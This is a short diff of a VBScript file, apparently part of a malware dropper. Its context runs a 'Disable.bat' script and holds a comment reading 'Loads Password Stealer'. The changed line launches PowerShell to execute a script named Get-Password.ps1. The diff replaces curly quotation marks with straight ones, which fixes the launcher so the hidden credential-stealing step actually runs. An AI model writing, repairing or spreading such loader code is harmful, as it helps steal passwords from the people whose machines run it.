@@ -14,7 +14,7 @@ CreateObject("Wscript.Shell").Run """Disable.bat""", 1, True
 
 ''' Loads Password Stealer
 Set objShell = CreateObject( "Wscript.shell" )
-objShell.run(“powershell -noexit -file c:\fso\Get-Password.ps1”)
+objShell.run("powershell -noexit -file c:\fso\Get-Password.ps1")
 
 
 
